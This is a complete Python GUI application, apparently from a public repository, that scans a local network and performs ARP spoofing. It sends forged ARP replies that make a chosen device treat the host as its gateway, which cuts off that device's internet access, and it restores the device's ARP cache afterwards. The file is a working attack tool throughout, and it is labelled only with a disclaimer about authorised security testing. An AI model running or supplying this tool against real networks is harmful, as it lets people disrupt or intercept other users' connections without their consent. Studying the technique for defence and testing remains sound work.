"""
Network Access Blocker — ARP-based network access control tool.

This tool uses ARP Spoofing to selectively block internet access for devices
on a local network. Designed for ethical security testing and educational purposes.

Author: Jairo RC
License: MIT
"""

import ctypes
import ipaddress
import logging
import os
import platform
import sys
import threading
import time
from typing import Optional

# pyrefly: ignore [missing-import]
import customtkinter as ctk
import netifaces
import scapy.all as scapy
from tkinter import messagebox, ttk

# ---------------------------------------------------------------------------
# Logging Configuration
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("NetworkAccessBlocker")

# ---------------------------------------------------------------------------
# GUI Theme
# ---------------------------------------------------------------------------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
ARP_SCAN_TIMEOUT: int = 2
ARP_SPOOF_INTERVAL: float = 1.5
ARP_RESTORE_ATTEMPTS: int = 5
DEFAULT_GATEWAY: str = "192.168.1.1"
WINDOW_WIDTH: int = 560
WINDOW_HEIGHT: int = 580


# ---------------------------------------------------------------------------
# Utility Functions
# ---------------------------------------------------------------------------
def is_admin() -> bool:
    """Check whether the current process has administrator/root privileges."""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except AttributeError:
        return False


def validate_ip(ip: str) -> bool:
    """Return True if *ip* is a valid IPv4 address string."""
    try:
        ipaddress.IPv4Address(ip)
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False


# ---------------------------------------------------------------------------
# Main Application
# ---------------------------------------------------------------------------
class NetworkAccessBlocker(ctk.CTk):
    """GUI application for ARP-based network access control.

    The application scans the local network for active devices, allows the
    user to select (or manually enter) a target IP address, and performs ARP
    Spoofing to block the target's internet access.  When blocking is stopped
    the ARP cache of the target device is restored to its legitimate state.
    """

    def __init__(self) -> None:
        super().__init__()

        # ── Window setup ──────────────────────────────────────────────────
        self.title("Network Access Blocker")
        self.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.resizable(False, False)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        # ── State ─────────────────────────────────────────────────────────
        self._running: bool = False
        self._attack_thread: Optional[threading.Thread] = None
        self._target_ip: Optional[str] = None
        self._router_ip: str = self._detect_gateway()
        self._router_mac: Optional[str] = None

        # ── Build UI ──────────────────────────────────────────────────────
        self._build_ui()

        # ── Initial network scan (threaded so UI isn't blocked) ───────────
        self._scan_network_threaded()

    # ── Gateway detection ─────────────────────────────────────────────────

    def _detect_gateway(self) -> str:
        """Auto-detect the default gateway IP from the host's routing table."""
        try:
            gateways = netifaces.gateways()
            default_gw = gateways.get("default", {}).get(netifaces.AF_INET)
            if default_gw:
                gateway_ip = default_gw[0]
                logger.info("Gateway detected: %s", gateway_ip)
                return gateway_ip
        except (KeyError, IndexError, TypeError):
            pass

        logger.warning(
            "Could not auto-detect gateway. Falling back to %s", DEFAULT_GATEWAY
        )
        messagebox.showwarning(
            "Gateway Detection",
            f"Could not auto-detect the gateway IP.\nFalling back to {DEFAULT_GATEWAY}.",
        )
        return DEFAULT_GATEWAY

    # ── UI Construction ───────────────────────────────────────────────────

    def _build_ui(self) -> None:
        """Construct all GUI widgets."""

        # Header
        header = ctk.CTkLabel(
            self,
            text="🛡️  Network Access Blocker",
            font=("Segoe UI", 22, "bold"),
        )
        header.pack(pady=(20, 5))

        subtitle = ctk.CTkLabel(
            self,
            text="ARP-based device access control",
            font=("Segoe UI", 12),
            text_color="#888888",
        )
        subtitle.pack(pady=(0, 15))

        # ── Network info frame ────────────────────────────────────────────
        info_frame = ctk.CTkFrame(self, fg_color="#1a1a2e", corner_radius=10)
        info_frame.pack(padx=20, pady=5, fill="x")

        ctk.CTkLabel(
            info_frame,
            text=f"🌐  Gateway:  {self._router_ip}",
            font=("Segoe UI", 12),
            text_color="#00d4aa",
        ).pack(pady=8, padx=15, anchor="w")

        # ── Target selection frame ────────────────────────────────────────
        target_frame = ctk.CTkFrame(self, corner_radius=10)
        target_frame.pack(padx=20, pady=10, fill="x")

        ctk.CTkLabel(
            target_frame,
            text="Target Device",
            font=("Segoe UI", 14, "bold"),
        ).pack(pady=(10, 5), padx=15, anchor="w")

        # IP entry row
        entry_row = ctk.CTkFrame(target_frame, fg_color="transparent")
        entry_row.pack(padx=15, pady=5, fill="x")

        self._ip_entry = ctk.CTkEntry(
            entry_row,
            width=220,
            placeholder_text="Enter IP manually…",
            font=("Segoe UI", 12),
        )
        self._ip_entry.pack(side="left", padx=(0, 10))

        self._ip_combo = ttk.Combobox(entry_row, state="readonly", width=24)
        self._ip_combo.pack(side="left", fill="x", expand=True)

        # Scan button
        self._scan_btn = ctk.CTkButton(
            target_frame,
            text="🔄  Re-scan Network",
            font=("Segoe UI", 12),
            fg_color="#2d2d44",
            hover_color="#3d3d55",
            command=self._scan_network_threaded,
        )
        self._scan_btn.pack(pady=(5, 10), padx=15, fill="x")

        # ── Scan status ──────────────────────────────────────────────────
        self._scan_status = ctk.CTkLabel(
            self,
            text="",
            font=("Segoe UI", 11),
            text_color="#888888",
        )
        self._scan_status.pack(pady=(0, 5))

        # ── Action buttons ────────────────────────────────────────────────
        btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        btn_frame.pack(padx=20, pady=5, fill="x")

        self._block_btn = ctk.CTkButton(
            btn_frame,
            text="⛔  Block Device",
            font=("Segoe UI", 14, "bold"),
            fg_color="#c0392b",
            hover_color="#e74c3c",
            height=42,
            command=self._start_blocking,
        )
        self._block_btn.pack(side="left", expand=True, fill="x", padx=(0, 5))

        self._restore_btn = ctk.CTkButton(
            btn_frame,
            text="✅  Restore Access",
            font=("Segoe UI", 14, "bold"),
            fg_color="#27ae60",
            hover_color="#2ecc71",
            height=42,
            command=self._stop_blocking,
        )
        self._restore_btn.pack(side="left", expand=True, fill="x", padx=(5, 0))

        # ── Status indicator ──────────────────────────────────────────────
        self._status_frame = ctk.CTkFrame(self, fg_color="#1a1a2e", corner_radius=10)
        self._status_frame.pack(padx=20, pady=15, fill="x")

        self._status_label = ctk.CTkLabel(
            self._status_frame,
            text="🟢  Idle — No device is being blocked",
            font=("Segoe UI", 13),
            text_color="#aaaaaa",
        )
        self._status_label.pack(pady=12, padx=15)

        # ── Footer ────────────────────────────────────────────────────────
        footer = ctk.CTkLabel(
            self,
            text="⚠️  For authorized security testing only",
            font=("Segoe UI", 10),
            text_color="#555555",
        )
        footer.pack(side="bottom", pady=10)

    # ── Network Scanning ──────────────────────────────────────────────────

    def _scan_network_threaded(self) -> None:
        """Launch the network scan in a background thread to avoid freezing the GUI."""
        self._scan_btn.configure(state="disabled")
        self._scan_status.configure(
            text="🔍  Scanning network…", text_color="#f39c12"
        )
        thread = threading.Thread(target=self._scan_network, daemon=True)
        thread.start()

    def _scan_network(self) -> None:
        """Perform an ARP scan of the local /24 subnet and update the device list."""
        try:
            ip_range = f"{self._router_ip}/24"
            logger.info("Scanning network range: %s", ip_range)
            ans, _ = scapy.arping(ip_range, timeout=ARP_SCAN_TIMEOUT, verbose=False)

            devices: list[str] = []
            for _, rcv in ans:
                ip = rcv.psrc
                if ip != self._router_ip:
                    devices.append(ip)

            devices.sort(key=lambda ip: list(map(int, ip.split("."))))
            logger.info("Scan complete. Found %d device(s).", len(devices))

            # Update UI on the main thread
            self.after(0, self._update_device_list, devices)

        except Exception as exc:
            logger.error("Network scan failed: %s", exc)
            self.after(
                0,
                lambda: self._scan_status.configure(
                    text="❌  Scan failed — check permissions",
                    text_color="#e74c3c",
                ),
            )
            self.after(0, lambda: self._scan_btn.configure(state="normal"))

    def _update_device_list(self, devices: list[str]) -> None:
        """Populate the combo-box with discovered devices (runs on main thread)."""
        self._ip_combo["values"] = devices
        if devices:
            self._ip_combo.current(0)
            self._scan_status.configure(
                text=f"✅  Found {len(devices)} device(s) on the network",
                text_color="#27ae60",
            )
        else:
            self._ip_combo.set("")
            self._scan_status.configure(
                text="⚠️  No devices found — try re-scanning",
                text_color="#f39c12",
            )
        self._scan_btn.configure(state="normal")

    # ── MAC Resolution ────────────────────────────────────────────────────

    @staticmethod
    def _resolve_mac(ip: str) -> Optional[str]:
        """Resolve the MAC address for the given IP via an ARP request."""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            answered = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
            if answered:
                return answered[0][1].hwsrc
        except Exception as exc:
            logger.error("MAC resolution failed for %s: %s", ip, exc)
        return None

    # ── ARP Spoofing ──────────────────────────────────────────────────────

    def _spoof(self, target_ip: str, gateway_ip: str) -> None:
        """Continuously send forged ARP replies to the target device.

        The forged packets tell the target that the gateway's IP address
        maps to our MAC address, causing the target to send its traffic
        to us instead of the real gateway.
        """
        target_mac = self._resolve_mac(target_ip)
        if target_mac is None:
            logger.error("Cannot resolve MAC for target %s. Aborting.", target_ip)
            self.after(
                0,
                lambda: messagebox.showerror(
                    "Error",
                    f"Could not resolve MAC address for {target_ip}.\n"
                    "Make sure the device is online and try again.",
                ),
            )
            self._running = False
            self.after(0, self._set_idle_status)
            return

        logger.info(
            "Spoofing started: target=%s (%s), gateway=%s",
            target_ip, target_mac, gateway_ip,
        )

        packet = scapy.ARP(
            op=2,          # ARP Reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
        )

        while self._running:
            try:
                scapy.send(packet, verbose=False, count=1)
                time.sleep(ARP_SPOOF_INTERVAL)
            except Exception as exc:
                logger.error("Spoofing error: %s", exc)
                break

        # ── Restore ARP table when done ───────────────────────────────────
        self._restore_arp(target_ip, target_mac, gateway_ip)

    def _restore_arp(
        self, target_ip: str, target_mac: str, gateway_ip: str
    ) -> None:
        """Send corrective ARP packets to restore the target's ARP cache."""
        gateway_mac = self._resolve_mac(gateway_ip)
        if gateway_mac is None:
            logger.warning(
                "Could not resolve gateway MAC for ARP restoration. "
                "Target device may need to be reconnected manually."
            )
            return

        restore_packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac,  # Real gateway MAC
        )

        logger.info(
            "Restoring ARP table for %s (gateway MAC: %s)…",
            target_ip, gateway_mac,
        )

        for _ in range(ARP_RESTORE_ATTEMPTS):
            scapy.send(restore_packet, verbose=False, count=2)
            time.sleep(0.3)

        logger.info("ARP table restored for %s.", target_ip)

    # ── Blocking Controls ─────────────────────────────────────────────────

    def _start_blocking(self) -> None:
        """Validate inputs and start ARP spoofing in a background thread."""
        if self._running:
            messagebox.showinfo("Info", "A blocking session is already active.")
            return

        # Determine target IP (manual entry takes priority)
        target_ip = self._ip_entry.get().strip()
        if not target_ip:
            target_ip = self._ip_combo.get().strip()

        if not target_ip:
            messagebox.showwarning(
                "No Target",
                "Please enter or select a target IP address.",
            )
            return

        if not validate_ip(target_ip):
            messagebox.showwarning(
                "Invalid IP",
                f"'{target_ip}' is not a valid IPv4 address.",
            )
            return

        if target_ip == self._router_ip:
            messagebox.showwarning(
                "Invalid Target",
                "You cannot block the gateway/router itself.",
            )
            return

        self._running = True
        self._target_ip = target_ip

        self._status_label.configure(
            text=f"🔴  Blocking  {target_ip}",
            text_color="#e74c3c",
        )
        self._status_frame.configure(fg_color="#2e1a1a")

        self._attack_thread = threading.Thread(
            target=self._spoof,
            args=(target_ip, self._router_ip),
            daemon=True,
        )
        self._attack_thread.start()

        logger.info("Blocking session started for %s.", target_ip)

    def _stop_blocking(self) -> None:
        """Signal the spoofing thread to stop and restore the target's ARP cache."""
        if not self._running:
            messagebox.showinfo("Info", "No blocking session is currently active.")
            return

        self._running = False
        self._set_idle_status()
        logger.info("Blocking session stopped.")
        messagebox.showinfo(
            "Access Restored",
            f"Device {self._target_ip} should regain internet access shortly.\n"
            "ARP restoration packets have been sent.",
        )

    def _set_idle_status(self) -> None:
        """Reset the status indicator to idle state."""
        self._status_label.configure(
            text="🟢  Idle — No device is being blocked",
            text_color="#aaaaaa",
        )
        self._status_frame.configure(fg_color="#1a1a2e")

    # ── Clean Shutdown ────────────────────────────────────────────────────

    def _on_close(self) -> None:
        """Handle window close: stop any active spoofing before exiting."""
        if self._running:
            self._running = False
            # Give the spoofing thread a moment to send restore packets
            if self._attack_thread and self._attack_thread.is_alive():
                self._attack_thread.join(timeout=5)
            logger.info("Application closed. ARP table restoration attempted.")
        self.destroy()


# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------
def main() -> None:
    """Application entry point with privilege verification."""
    if not is_admin():
        logger.error("Insufficient privileges. Please run as Administrator/root.")
        messagebox.showerror(
            "Privileges Required",
            "This application requires Administrator (Windows) or root (Linux) privileges.\n\n"
            "Please restart the application with elevated permissions.",
        )
        sys.exit(1)

    logger.info("Network Access Blocker started.")
    app = NetworkAccessBlocker()
    app.mainloop()


if __name__ == "__main__":
    main()